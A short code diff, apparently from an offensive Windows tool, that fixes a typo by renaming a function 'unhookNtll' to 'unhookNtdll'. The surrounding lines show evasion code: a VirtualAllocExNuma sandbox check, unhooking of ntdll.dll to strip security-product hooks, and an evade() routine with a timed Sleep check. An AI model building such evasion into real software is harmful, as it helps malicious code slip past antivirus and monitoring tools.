@@ -79,7 +79,7 @@ BOOL CheckVirtualAllocExNuma(){
     return TRUE;
 }
 
-void unhookNtll(){
+void unhookNtdll(){
     HANDLE process = GetCurrentProcess();
 	MODULEINFO mi = {};
 	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
@@ -112,7 +112,7 @@ void unhookNtll(){
 }
 
 void evade() {
-    unhookNtll();
+    unhookNtdll();
     FILETIME startTime;
     GetSystemTimeAsFileTime(&startTime);
     Sleep(2000);
